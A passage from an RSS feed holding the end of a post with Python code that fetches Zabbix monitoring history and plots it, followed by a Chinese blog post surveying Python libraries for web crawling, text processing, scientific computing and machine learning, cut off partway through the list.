&lt;span class=&quot;n&quot;&gt;begin&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;mktime&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;datetime&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;now&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;timetuple&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;())&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;3600&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;HOURS&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&#39;Begin loop for history...&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;item&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;items&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;params&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;s&quot;&gt;&#39;output&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&#39;extend&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;s&quot;&gt;&#39;history&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;s&quot;&gt;&#39;itemids&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;item&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&#39;itemid&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt;
    &lt;span class=&quot;s&quot;&gt;&#39;time_from&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;begin&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;ret&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;zabbixCall&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&#39;history.get&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;params&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;authId&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;history&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;map&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;lambda&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;float&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&#39;value&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]),&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ret&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;v&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;np&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;history&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

  &lt;span class=&quot;n&quot;&gt;plt&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;figure&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;plt&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hist&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bins&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;200&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;normed&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;plt&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;title&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&#39;item: &#39;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;item&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&#39;itemid&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;

&lt;span class=&quot;c&quot;&gt;#  lline = numpy.percentile(v, 25)&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;#  uline = numpy.percentile(v, 75)&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;#  low = 2 * lline - uline&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;#  up = 2 * uline - lline&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;plt&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;figure&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;plt&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;boxplot&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sym&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&#39;+&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;notch&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;True&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;plt&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;title&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&#39;item: &#39;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;item&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&#39;itemid&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;plt&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;show&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;


    &lt;hr&gt;
    
    &lt;hr&gt;
    


  &lt;!-- UY BEGIN --&gt;


&lt;!-- UY END --&gt;






  &lt;/div&gt;

</description>
        <pubDate>Sun, 27 Jul 2014 00:00:00 +0800</pubDate>
        <link>http://iftti.com/posts/2014/2014-07-27-using-pdl-on-macbook-0a2e8590f.html</link>
        <guid isPermaLink="true">http://iftti.com/posts/2014/2014-07-27-using-pdl-on-macbook-0a2e8590f.html</guid>
        
        
      </item>
    
      <item>
        <title>Python 网页爬虫 &amp; 文本处理 &amp; 科学计算 &amp; 机器学习 &amp; 数据挖掘兵器谱</title>
        <description>

						&lt;p&gt;曾经因为&lt;a href=&quot;http://www.52nlp.cn/%E6%8E%A8%E8%8D%90%EF%BC%8D%E7%94%A8python%E8%BF%9B%E8%A1%8C%E8%87%AA%E7%84%B6%E8%AF%AD%E8%A8%80%E5%A4%84%E7%90%86%EF%BC%8D%E4%B8%AD%E6%96%87%E7%BF%BB%E8%AF%91-nltk%E9%85%8D%E5%A5%97%E4%B9%A6&quot;&gt;NLTK&lt;/a&gt;的缘故开始学习Python，之后渐渐成为我工作中的第一辅助脚本语言，虽然开发语言是C/C++，但平时的很多文本数据处理任务都交给了Python。离开腾讯创业后，第一个作品&lt;a href=&quot;http://coursegraph.com/&quot;&gt;课程图谱&lt;/a&gt;也是选择了Python系的Flask框架，渐渐的将自己的绝大部分工作交给了Python。这些年来，接触和使用了很多Python工具包，特别是在文本处理，科学计算，机器学习和数据挖掘领域，有很多很多优秀的Python工具包可供使用，所以作为Pythoner，也是相当幸福的。其实如果仔细留意微博，你会发现很多这方面的分享，自己也Google了一下，发现也有同学总结了“&lt;a href=&quot;http://qxde01.blog.163.com/blog/static/67335744201368101922991/&quot;&gt;Python机器学习库&lt;/a&gt;”，不过总感觉缺少点什么。最近流行一个词，全栈工程师（full stack engineer），作为一个苦逼的创业者，天然的要把自己打造成一个full stack engineer，而这个过程中，这些Python工具包给自己提供了足够的火力，所以想起了这个系列。当然，这也仅仅是抛砖引玉，希望大家能提供更多的线索，来汇总整理一套Python网页爬虫，文本处理，科学计算，机器学习和数据挖掘的兵器谱。&lt;/p&gt;
&lt;p&gt;一、Python网页爬虫工具集&lt;/p&gt;
&lt;p&gt;一个真实的项目，一定是从获取数据开始的。无论文本处理，机器学习和数据挖掘，都需要数据，除了通过一些渠道购买或者下载的专业数据外，常常需要大家自己动手爬数据，这个时候，爬虫就显得格外重要了，幸好，Python提供了一批很不错的网页爬虫工具框架，既能爬取数据，也能获取和清洗数据，我们也就从这里开始了：&lt;/p&gt;
&lt;p&gt;1. &lt;a href=&quot;http://scrapy.org/&quot;&gt;Scrapy&lt;/a&gt;&lt;/p&gt;
&lt;blockquote&gt;&lt;p&gt;Scrapy, a fast high-level screen scraping and web crawling framework for Python.&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;鼎鼎大名的Scrapy，相信不少同学都有耳闻，&lt;a href=&quot;http://coursegraph.com&quot;&gt;课程图谱&lt;/a&gt;中的很多课程都是依靠Scrapy抓去的，这方面的介绍文章有很多，推荐大牛pluskid早年的一篇文章：《&lt;a href=&quot;http://blog.pluskid.org/?p=366&quot;&gt;Scrapy 轻松定制网络爬虫&lt;/a&gt;》，历久弥新。&lt;/p&gt;
&lt;p&gt;官方主页：&lt;a href=&quot;http://scrapy.org/&quot;&gt;http://scrapy.org/&lt;/a&gt;&lt;br&gt;
Github代码页: &lt;a href=&quot;https://github.com/scrapy/scrapy&quot;&gt;https://github.com/scrapy/scrapy&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;2. &lt;a href=&quot;http://www.crummy.com/software/BeautifulSoup/&quot;&gt;Beautiful Soup&lt;/a&gt;&lt;/p&gt;
&lt;blockquote&gt;&lt;p&gt;You didn’t write that awful page. You’re just trying to get some data out of it. Beautiful Soup is here to help. Since 2004, it’s been saving programmers hours or days of work on quick-turnaround screen scraping projects.&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;读书的时候通过《集体智慧编程》这本书知道Beautiful Soup的，后来也偶尔会用用，非常棒的一套工具。客观的说，Beautifu Soup不完全是一套爬虫工具，需要配合urllib使用，而是一套HTML/XML数据分析，清洗和获取工具。&lt;/p&gt;
&lt;p&gt;官方主页：&lt;a href=&quot;http://www.crummy.com/software/BeautifulSoup/&quot;&gt;http://www.crummy.com/software/BeautifulSoup/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;3. &lt;a href=&quot;https://github.com/grangier/python-goose&quot;&gt;Python-Goose&lt;/a&gt;&lt;/p&gt;
&lt;blockquote&gt;&lt;p&gt;Html Content / Article Extractor, web scrapping lib in Python&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;&lt;a href=&quot;https://github.com/GravityLabs/goose&quot;&gt;Goose&lt;/a&gt;最早是用Java写得，后来用Scala重写，是一个Scala项目。Python-Goose用Python重写，依赖了Beautiful Soup。前段时间用过，感觉很不错，给定一个文章的URL, 获取文章的标题和内容很方便。&lt;/p&gt;
&lt;p&gt;Github主页：&lt;a href=&quot;https://github.com/grangier/python-goose&quot;&gt;https://github.com/grangier/python-goose&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;二、Python文本处理工具集&lt;/p&gt;
&lt;p&gt;从网页上获取文本数据之后，依据任务的不同，就需要进行基本的文本处理了，譬如对于英文来说，需要基本的tokenize，对于中文，则需要常见的中文分词，进一步的话，无论英文中文，还可以词性标注，句法分析，关键词提取，文本分类，情感分析等等。这个方面，特别是面向英文领域，有很多优秀的工具包，我们一一道来。&lt;br&gt;
&lt;span id=&quot;more-6666&quot;&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;1. &lt;a href=&quot;http://www.nltk.org/&quot;&gt;NLTK&lt;/a&gt; — Natural Language Toolkit&lt;/p&gt;
&lt;blockquote&gt;&lt;p&gt;NLTK is a leading platform for building Python programs to work with human language data. It provides easy-to-use interfaces to over 50 corpora and lexical resources such as WordNet, along with a suite of text processing libraries for classification, tokenization, stemming, tagging, parsing, and semantic reasoning, and an active discussion forum.&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;搞自然语言处理的同学应该没有人不知道NLTK吧，这里也就不多说了。不过推荐两本书籍给刚刚接触NLTK或者需要详细了解NLTK的同学: 一个是官方的《Natural Language Processing with Python》，以介绍NLTK里的功能用法为主，同时附带一些Python知识，同时国内陈涛同学友情翻译了一个中文版，这里可以看到：&lt;a href=&quot;http://www.52nlp.cn/%E6%8E%A8%E8%8D%90%EF%BC%8D%E7%94%A8python%E8%BF%9B%E8%A1%8C%E8%87%AA%E7%84%B6%E8%AF%AD%E8%A8%80%E5%A4%84%E7%90%86%EF%BC%8D%E4%B8%AD%E6%96%87%E7%BF%BB%E8%AF%91-nltk%E9%85%8D%E5%A5%97%E4%B9%A6&quot;&gt;推荐《用Python进行自然语言处理》中文翻译-NLTK配套书&lt;/a&gt;；另外一本是《Python Text Processing with NLTK 2.0 Cookbook》，这本书要深入一些，会涉及到NLTK的代码结构，同时会介绍如何定制自己的语料和模型等，相当不错。&lt;/p&gt;
&lt;p&gt;官方主页：&lt;a href=&quot;http://www.nltk.org/&quot;&gt;http://www.nltk.org/&lt;/a&gt;&lt;br&gt;
Github代码页：&lt;a href=&quot;https://github.com/nltk/nltk&quot;&gt;https://github.com/nltk/nltk&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;2. &lt;a href=&quot;http://www.clips.ua.ac.be/pattern&quot;&gt;Pattern&lt;/a&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Pattern is a web mining module for the Python programming language.&lt;/p&gt;
&lt;p&gt;It has tools for data mining (Google, Twitter and Wikipedia API, a web crawler, a HTML DOM parser), natural language processing (part-of-speech taggers, n-gram search, sentiment analysis, WordNet), machine learning (vector space model, clustering, SVM), network analysis and canvas visualization.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Pattern由比利时安特卫普大学CLiPS实验室出品，客观的说，Pattern不仅仅是一套文本处理工具，它更是一套web数据挖掘工具，囊括了数据抓取模块（包括Google, Twitter, 维基百科的API，以及爬虫和HTML分析器），文本处理模块（词性标注，情感分析等），机器学习模块(VSM, 聚类，SVM）以及可视化模块等，可以说，Pattern的这一整套逻辑也是这篇文章的组织逻辑，不过这里我们暂且把Pattern放到文本处理部分。我个人主要使用的是它的英文处理模块&lt;a href=&quot;http://www.clips.ua.ac.be/pages/pattern-en&quot;&gt;Pattern.en&lt;/a&gt;, 有很多很不错的文本处理功能，包括基础的tokenize, 词性标注，句子切分，语法检查，拼写纠错，情感分析，句法分析等，相当不错。&lt;/p&gt;
&lt;p&gt;官方主页：&lt;a href=&quot;http://www.clips.ua.ac.be/pattern&quot;&gt;http://www.clips.ua.ac.be/pattern&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;3. &lt;a href=&quot;http://textblob.readthedocs.org/en/dev/&quot;&gt;TextBlob&lt;/a&gt;: Simplified Text Processing&lt;/p&gt;
&lt;blockquote&gt;&lt;p&gt;TextBlob is a Python (2 and 3) library for processing textual data. It provides a simple API for diving into common natural language processing (NLP) tasks such as part-of-speech tagging, noun phrase extraction, sentiment analysis, classification, translation, and more.&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;TextBlob是一个很有意思的Python文本处理工具包，它其实是基于上面两个Python工具包NLKT和Pattern做了封装（TextBlob stands on the giant shoulders of NLTK and pattern, and plays nicely with both），同时提供了很多文本处理功能的接口，包括词性标注，名词短语提取，情感分析，文本分类，拼写检查等，甚至包括翻译和语言检测，不过这个是基于Google的API的，有调用次数限制。TextBlob相对比较年轻，有兴趣的同学可以关注。&lt;/p&gt;
&lt;p&gt;官方主页：&lt;a href=&quot;http://textblob.readthedocs.org/en/dev/&quot;&gt;http://textblob.readthedocs.org/en/dev/&lt;/a&gt;&lt;br&gt;
Github代码页：&lt;a href=&quot;https://github.com/sloria/textblob&quot;&gt;https://github.com/sloria/textblob&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;4. &lt;a href=&quot;http://www.clips.ua.ac.be/pages/MBSP&quot;&gt;MBSP&lt;/a&gt; for Python&lt;/p&gt;
&lt;blockquote&gt;&lt;p&gt;MBSP is a text analysis system based on the TiMBL and MBT memory based learning applications developed at CLiPS and ILK. It provides tools for Tokenization and Sentence Splitting, Part of Speech Tagging, Chunking, Lemmatization, Relation Finding and Prepositional Phrase Attachment.&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;MBSP与Pattern同源，同出自比利时安特卫普大学CLiPS实验室，提供了Word Tokenization, 句子切分，词性标注，Chunking, Lemmatization，句法分析等基本的文本处理功能，感兴趣的同学可以关注。&lt;/p&gt;
&lt;p&gt;官方主页：&lt;a href=&quot;http://www.clips.ua.ac.be/pages/MBSP&quot;&gt;http://www.clips.ua.ac.be/pages/MBSP&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;5. &lt;a href=&quot;http://radimrehurek.com/gensim/index.html&quot;&gt;Gensim&lt;/a&gt;: Topic modeling for humans&lt;/p&gt;
&lt;p&gt;Gensim是一个相当专业的主题模型Python工具包，无论是代码还是文档，我们曾经用《&lt;a href=&quot;http://www.52nlp.cn/%E5%A6%82%E4%BD%95%E8%AE%A1%E7%AE%97%E4%B8%A4%E4%B8%AA%E6%96%87%E6%A1%A3%E7%9A%84%E7%9B%B8%E4%BC%BC%E5%BA%A6%E4%B8%80&quot;&gt;如何计算两个文档的相似度&lt;/a&gt;》介绍过Gensim的安装和使用过程，这里就不多说了。&lt;/p&gt;
&lt;p&gt;官方主页：&lt;a href=&quot;http://radimrehurek.com/gensim/index.html&quot;&gt;http://radimrehurek.com/gensim/index.html&lt;/a&gt;&lt;br&gt;
github代码页：&lt;a href=&quot;https://github.com/piskvorky/gensim&quot;&gt;https://github.com/piskvorky/gensim&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;6. &lt;a href=&quot;https://github.com/saffsd/langid.py&quot;&gt;langid.py&lt;/a&gt;: Stand-alone language identification system&lt;/p&gt;
&lt;p&gt;语言检测是一个很有意思的话题，不过相对比较成熟，这方面的解决方案很多，也有很多不错的开源工具包，不过对于Python来说，我使用过langid这个工具包，也非常愿意推荐它。langid目前支持97种语言的检测，提供了很多易用的功能，包括可以启动一个建议的server，通过json调用其API，可定制训练自己的语言检测模型等，可以说是“麻雀虽小，五脏俱全”。&lt;/p&gt;
&lt;p&gt;Github主页：&lt;a href=&quot;https://github.com/saffsd/langid.py&quot;&gt;https://github.com/saffsd/langid.py&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;7. &lt;a href=&quot;https://github.com/fxsjy/jieba&quot;&gt;Jieba&lt;/a&gt;: 结巴中文分词&lt;/p&gt;
&lt;blockquote&gt;&lt;p&gt;“结巴”中文分词：做最好的Python中文分词组件 “Jieba” (Chinese for “to stutter”) Chinese text segmentation: built to be the best Python Chinese word segmentation module.&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;好了，终于可以说一个国内的Python文本处理工具包了：结巴分词，其功能包括支持三种分词模式（精确模式、全模式、搜索引擎模式），支持繁体分词，支持自定义词典等，是目前一个非常不错的Python中文分词解决方案。&lt;/p&gt;
&lt;p&gt;Github主页：&lt;a href=&quot;https://github.com/fxsjy/jieba&quot;&gt;https://github.com/fxsjy/jieba&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;8. &lt;a href=&quot;https://github.com/NLeSC/xtas&quot;&gt;xTAS&lt;/a&gt;&lt;/p&gt;
&lt;blockquote&gt;&lt;p&gt;xtas, the eXtensible Text Analysis Suite, a distributed text analysis package based on Celery and Elasticsearch.&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;感谢微博朋友 &lt;a href=&quot;http://weibo.com/sinorichard&quot;&gt;@大山坡的春&lt;/a&gt; 提供的线索：我们组同事之前发布了xTAS，也是基于python的text mining工具包，欢迎使用，链接：http://t.cn/RPbEZOW。看起来很不错的样子，回头试用一下。&lt;/p&gt;
&lt;p&gt;Github代码页：&lt;a href=&quot;https://github.com/NLeSC/xtas&quot;&gt;https://github.com/NLeSC/xtas&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;三、Python科学计算工具包&lt;/p&gt;
&lt;p&gt;说起科学计算，大家首先想起的是Matlab，集数值计算，可视化工具及交互于一身，不过可惜是一个商业产品。开源方面除了&lt;a href=&quot;http://www.gnu.org/software/octave/&quot;&gt;GNU Octave&lt;/a&gt;在尝试做一个类似Matlab的工具包外，Python的这几个工具包集合到一起也可以替代Matlab的相应功能：NumPy+SciPy+Matplotlib+iPython。同时，这几个工具包，特别是NumPy和SciPy，也是很多Python文本处理 &amp;amp; 机器学习 &amp;amp; 数据挖掘工具包的基础，非常重要。最后再推荐一个系列《&lt;a href=&quot;http://sebug.net/paper/books/scipydoc/index.html&quot;&gt;用Python做科学计算&lt;/a&gt;》，将会涉及到NumPy, SciPy, Matplotlib，可以做参考。&lt;/p&gt;
&lt;p&gt;1. &lt;a href=&quot;http://www.numpy.org/&quot;&gt;NumPy&lt;/a&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;NumPy is the fundamental package for scientific computing with Python. It contains among other things:&lt;br&gt;
1）a powerful N-dimensional array object&lt;br&gt;
2）sophisticated (broadcasting) functions&lt;br&gt;
3）tools for integrating C/C++ and Fortran code&lt;br&gt;
4） useful linear algebra, Fourier transform, and random number capabilities&lt;/p&gt;
&lt;p&gt;Besides its obvious scientific uses, NumPy can also be used as an efficient multi-dimensional container of generic data. Arbitrary data-types can be defined. This allows NumPy to seamlessly and speedily integrate with a wide variety of databases.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;NumPy几乎是一个无法回避的科学计算工具包，最常用的也许是它的N维数组对象，其他还包括一些成熟的函数库，用于整合C/C++和Fortran代码的工具包，线性代数、傅里叶变换和随机数生成函数等。NumPy提供了两种基本的对象：ndarray（N-dimensional array object）和 ufunc（universal function object）。ndarray是存储单一数据类型的多维数组，而ufunc则是能够对数组进行处理的函数。&lt;/p&gt;
&lt;p&gt;官方主页：&lt;a href=&quot;http://www.numpy.org/&quot;&gt;http://www.numpy.org/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;2. &lt;a href=&quot;http://www.scipy.org/&quot;&gt;SciPy&lt;/a&gt;：Scientific Computing Tools for Python&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;SciPy refers to several related but distinct entities:&lt;/p&gt;
&lt;p&gt;1）The SciPy Stack, a collection of open source software for scientific computing in Python, and particularly a specified set of core packages.&lt;br&gt;
2）The community of people who use and develop this stack.&lt;br&gt;
3）Several conferences dedicated to scientific computing in Python – SciPy, EuroSciPy and SciPy.in.&lt;br&gt;
4）The SciPy library, one component of the SciPy stack, providing many numerical routines.
&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;“SciPy是一个开源的Python算法库和数学工具包，SciPy包含的模块有最优化、线性代数、积分、插值、特殊函数、快速傅里叶变换、信号处理和图像处理、常微分方程求解和其他科学与工程中常用的计算。其功能与软件MATLAB、Scilab和GNU Octave类似。 Numpy和Scipy常常结合着使用，Python大多数机器学习库都依赖于这两个模块。”—-引用自“&lt;a href=&quot;http://qxde01.blog.163.com/blog/static/67335744201368101922991/&quot;&gt;Python机器学习库&lt;/a&gt;”&lt;/p&gt;
&lt;p&gt;官方主页：&lt;a href=&quot;http://www.scipy.org/&quot;&gt;http://www.scipy.org/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;3. &lt;a href=&quot;http://matplotlib.org/&quot;&gt;Matplotlib&lt;/a&gt;&lt;/p&gt;
&lt;blockquote&gt;&lt;p&gt;matplotlib is a python 2D plotting library which produces publication quality figures in a variety of hardcopy formats and interactive environments across platforms. matplotlib can be used in python scripts, the python and ipython shell (ala MATLAB®* or Mathematica®†), web application servers, and six graphical user interface toolkits.&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;matplotlib 是python最著名的绘图库，它提供了一整套和matlab相似的命令API，十分适合交互式地进行制图。而且也可以方便地将它作为绘图控件，嵌入GUI应用程序中。Matplotlib可以配合ipython shell使用，提供不亚于Matlab的绘图体验，总之用过了都说好。&lt;/p&gt;
&lt;p&gt;官方主页：&lt;a href=&quot;http://matplotlib.org/&quot;&gt;http://matplotlib.org/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;4. &lt;a href=&quot;http://ipython.org/&quot;&gt;iPython&lt;/a&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;IPython provides a rich architecture for interactive computing with:&lt;/p&gt;
&lt;p&gt;1）Powerful interactive shells (terminal and Qt-based).&lt;br&gt;
2）A browser-based notebook with support for code, text, mathematical expressions, inline plots and other rich media.&lt;br&gt;
3）Support for interactive data visualization and use of GUI toolkits.&lt;br&gt;
4）Flexible, embeddable interpreters to load into your own projects.&lt;br&gt;
5）Easy to use, high performance tools for parallel computing.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;“iPython 是一个Python 的交互式Shell，比默认的Python Shell 好用得多，功能也更强大。 她支持语法高亮、自动完成、代码调试、对象自省，支持 Bash Shell 命令，内置了许多很有用的功能和函式等，非常容易使用。 ” 启动iPython的时候用这个命令“ipython –pylab”，默认开启了matploblib的绘图交互，用起来很方便。&lt;/p&gt;
&lt;p&gt;官方主页：&lt;a href=&quot;http://ipython.org/&quot;&gt;http://ipython.org/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;四、Python 机器学习 &amp;amp; 数据挖掘 工具包&lt;/p&gt;
&lt;p&gt;机器学习和数据挖掘这两个概念不太好区分，这里就放到一起了。这方面的开源Python工具包有很多，这里先从熟悉的讲起，再补充其他来源的资料，也欢迎大家补充。&lt;/p&gt;
&lt;p&gt;1. &lt;a href=&quot;http://scikit-learn.org/&quot;&gt;scikit-learn&lt;/a&gt;: Machine Learning in Python&lt;/p&gt;
&lt;blockquote&gt;&lt;p&gt;scikit-learn (formerly scikits.learn) is an open source machine learning library for the Python programming language. It features various classification, regression and clustering algorithms including support vector machines, logistic regression, naive Bayes, random forests, gradient boosting, k-means and DBSCAN, and is designed to interoperate with the Python numerical and scientific libraries NumPy and SciPy.&lt;/p&gt;&lt;/blockquote&gt;
